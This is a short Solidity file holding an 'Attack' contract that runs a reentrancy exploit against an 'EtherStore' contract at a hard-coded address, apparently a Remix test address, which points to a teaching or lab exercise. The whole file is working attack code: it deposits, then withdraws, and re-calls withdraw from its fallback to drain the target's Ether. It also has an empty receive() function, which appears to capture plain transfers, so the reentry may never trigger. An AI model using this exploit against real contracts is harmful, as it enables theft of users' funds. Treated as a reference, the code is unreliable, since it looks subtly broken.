
pragma solidity ^0.7.6;
interface EtherStore {

    function deposit() external payable;
    function withdraw(uint _amount) external; 

}
contract Attack {

    EtherStore private etherStore;

    constructor() {
    etherStore = 
    EtherStore(address(0xd9145CCE52D386f254917e481eB44e9943F39138));
}


    fallback() external payable {
    if (address(etherStore).balance >= 1 ether) {
        etherStore.withdraw(1 ether);
    }
}
    receive()external payable{}

    function attack() external payable {
    require(msg.value >= 1 ether);
    etherStore.deposit{value: 1 ether}();
    etherStore.withdraw(1 ether);
}


    function getBalance() public view returns (uint) {
    return address(this).balance;
    }
}
